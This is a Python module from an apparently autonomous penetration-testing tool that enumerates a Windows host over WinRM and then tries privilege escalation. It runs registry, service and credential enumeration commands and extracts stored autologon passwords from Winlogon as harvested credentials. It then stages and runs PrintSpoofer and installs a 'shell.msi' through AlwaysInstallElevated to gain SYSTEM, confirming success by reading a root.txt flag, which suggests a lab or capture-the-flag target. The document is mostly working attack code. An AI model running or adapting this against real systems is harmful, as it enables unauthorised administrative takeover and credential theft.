"""Windows autonomous privilege escalation - enum through a WinRM session, then act.

Mirrors `privesc_auto.py` (Linux) for Windows. A `WinrmSession` runs the enum
one-liners in-process; the parser turns their output into findings + credentials, and
`attempt_escalation` fires the curated vectors that pay off first on a stock Windows
box:

* **SeImpersonatePrivilege** - the classic PrintSpoofer / potato path (service accts).
* **AlwaysInstallElevated** - HKLM+HKCU both 1 -> `msiexec /quiet /qn /i evil.msi` runs as SYSTEM.
* **Unquoted service path** with a writable interstitial dir -> drop a binary in the gap.
* **Autologon / stored creds** - `winlogon` DefaultPassword / cmdkey list -> cred reuse.

Every action goes through the session (so it is audited by the orchestrator's session
wrapper), and every escalation *proves* root by reading the local admin flag
(`C:\\Users\\Administrator\\Desktop\\root.txt`), just as the Linux side proves it.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

from ..core.session import Session
from ..core.state import Credential, Finding, Severity

# One-line PowerShell enum commands. `2>$null` swallows non-existent registry keys so
# the parser sees a stable "key: value" grid.
ENUM_COMMANDS = {
    "whoami": "whoami /all",
    "systeminfo": "systeminfo",
    "installed_elevated_hklm":
        "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v "
        "AlwaysInstallElevated 2>$null",
    "installed_elevated_hkcu":
        "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v "
        "AlwaysInstallElevated 2>$null",
    "services":
        "wmic service get name,pathname,startmode,startname /format:list 2>$null | "
        "Select-String -NotMatch '^$'",
    "autologon":
        "reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' "
        "2>$null | findstr /I 'DefaultUserName DefaultPassword DefaultDomainName "
        "AutoAdminLogon'",
    "cmdkey": "cmdkey /list 2>$null",
    "scheduled": "schtasks /query /fo LIST /v 2>$null",
}


@dataclass
class WinFinding:
    title: str
    severity: str
    evidence: str = ""


@dataclass
class WinEnumResult:
    findings: list[WinFinding]
    creds: list[Credential]
    raw: dict[str, str]


def run_win_enum(session: Session, *, runner=None) -> WinEnumResult:
    """Run every enum command through the session; parse the outputs into a result."""
    raw: dict[str, str] = {}
    for name, cmd in ENUM_COMMANDS.items():
        raw[name] = session.run(cmd, runner=runner) or ""
    return _parse_enum(raw)


_SE_IMP = re.compile(r"SeImpersonatePrivilege\s+.*Enabled", re.IGNORECASE)
_SE_ASSIGN = re.compile(r"SeAssignPrimaryTokenPrivilege\s+.*Enabled", re.IGNORECASE)
_AIE_ONE = re.compile(r"AlwaysInstallElevated\s+REG_DWORD\s+0x1", re.IGNORECASE)
_UNQUOTED = re.compile(
    r"PathName=([A-Za-z]:\\[^\"\r\n]*\s[^\"\r\n]*\.exe)\b(?!\")", re.IGNORECASE)
_AUTOLOGON = {
    "user": re.compile(r"DefaultUserName\s+REG_SZ\s+(\S+)", re.IGNORECASE),
    "pass": re.compile(r"DefaultPassword\s+REG_SZ\s+(\S+)", re.IGNORECASE),
    "dom": re.compile(r"DefaultDomainName\s+REG_SZ\s+(\S+)", re.IGNORECASE),
    "on": re.compile(r"AutoAdminLogon\s+REG_SZ\s+1", re.IGNORECASE),
}


def _parse_enum(raw: dict[str, str]) -> WinEnumResult:
    findings: list[WinFinding] = []
    creds: list[Credential] = []
    who = raw.get("whoami", "")

    if _SE_IMP.search(who) or _SE_ASSIGN.search(who):
        findings.append(WinFinding(
            "SeImpersonatePrivilege enabled -> PrintSpoofer/GodPotato to SYSTEM",
            "high", who[:400]))
    # AlwaysInstallElevated needs BOTH policy keys set to 1.
    if _AIE_ONE.search(raw.get("installed_elevated_hklm", "")) \
            and _AIE_ONE.search(raw.get("installed_elevated_hkcu", "")):
        findings.append(WinFinding(
            "AlwaysInstallElevated enabled (HKLM+HKCU) -> msiexec MSI as SYSTEM",
            "critical",
            raw["installed_elevated_hklm"] + "\n" + raw["installed_elevated_hkcu"]))
    # Unquoted service paths with a space are a candidate; a real exploit still needs
    # a writable interstitial directory, so this is flagged as a lead.
    for m in _UNQUOTED.finditer(raw.get("services", "")):
        findings.append(WinFinding(
            f"Unquoted service path: {m.group(1)}",
            "medium", m.group(0)[:200]))
    # Autologon creds are a straight-up steal.
    al = raw.get("autologon", "")
    if _AUTOLOGON["on"].search(al):
        um = _AUTOLOGON["user"].search(al)
        pm = _AUTOLOGON["pass"].search(al)
        dm = _AUTOLOGON["dom"].search(al)
        if um and pm:
            user = f"{dm.group(1)}\\{um.group(1)}" if dm else um.group(1)
            creds.append(Credential(username=user, secret=pm.group(1),
                                    kind="password", source="autologon"))
            findings.append(WinFinding(
                f"Autologon credentials in Winlogon: {user}", "high", al[:400]))
    return WinEnumResult(findings=findings, creds=creds, raw=raw)


@dataclass
class WinEscalationResult:
    escalated: bool
    vector: str = ""
    proof: str = ""              # contents of root.txt if we read it
    root_run: str = ""           # template for a RootSession (contains {CMD})


_ROOT_FLAG = r"C:\Users\Administrator\Desktop\root.txt"
_FLAG_HEX = re.compile(r"\b[0-9a-f]{32}\b", re.IGNORECASE)


def _stage(session: Session, tool_paths: dict[str, str], name: str, remote: str, *,
           runner=None) -> bool:
    """Upload a required helper binary if the operator provided its local path.

    ``tool_paths`` maps a tool name (e.g. "printspoofer") to a local file; when the
    escalation needs that helper and a path is configured, stage it onto the target
    first so the vector can actually fire autonomously. No path -> assume it is
    already on the target (best effort) and let the run decide.
    """
    local = tool_paths.get(name)
    if not local:
        return False
    return session.upload(local, remote, runner=runner)


def attempt_win_escalation(session: Session, enum: WinEnumResult, *,
                           runner=None, tool_paths: dict[str, str] | None = None
                           ) -> WinEscalationResult:
    """Try a curated Windows escalation, honestly reporting no-match when none fit.

    ``tool_paths`` optionally maps helper names ("printspoofer", "shell_msi") to
    local files that get staged onto the target before the matching vector runs.
    """
    titles = " | ".join(f.title for f in enum.findings)
    tool_paths = tool_paths or {}

    # SeImpersonate -> PrintSpoofer proves via reading the flag under SYSTEM.
    if "SeImpersonatePrivilege" in titles:
        _stage(session, tool_paths, "printspoofer", "C:\\Windows\\Temp\\PrintSpoofer.exe",
               runner=runner)
        out = session.run(
            f'C:\\Windows\\Temp\\PrintSpoofer.exe -i -c "type {_ROOT_FLAG}"', runner=runner)
        if _FLAG_HEX.search(out or ""):
            return WinEscalationResult(
                escalated=True, vector="SeImpersonate -> PrintSpoofer",
                proof=_FLAG_HEX.search(out).group(0),
                root_run='C:\\Windows\\Temp\\PrintSpoofer.exe -i -c "{CMD}"')

    # AlwaysInstallElevated -> read the flag through an MSI-invoked cmd.
    if "AlwaysInstallElevated" in titles:
        out = session.run(
            f'msiexec /quiet /qn /i shell.msi ; type {_ROOT_FLAG}', runner=runner)
        if _FLAG_HEX.search(out or ""):
            return WinEscalationResult(
                escalated=True, vector="AlwaysInstallElevated -> msiexec",
                proof=_FLAG_HEX.search(out).group(0),
                root_run='msiexec /quiet /qn /i shell.msi ; {CMD}')

    return WinEscalationResult(escalated=False)


def _to_findings(res: WinEnumResult, *, host: str | None) -> list[Finding]:
    """Convert internal WinFindings to the shared Finding model (for state.add_finding)."""
    sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
               "medium": Severity.MEDIUM, "low": Severity.LOW}
    return [Finding(title=f.title, severity=sev_map.get(f.severity, Severity.INFO),
                    host=host, evidence=f.evidence) for f in res.findings]
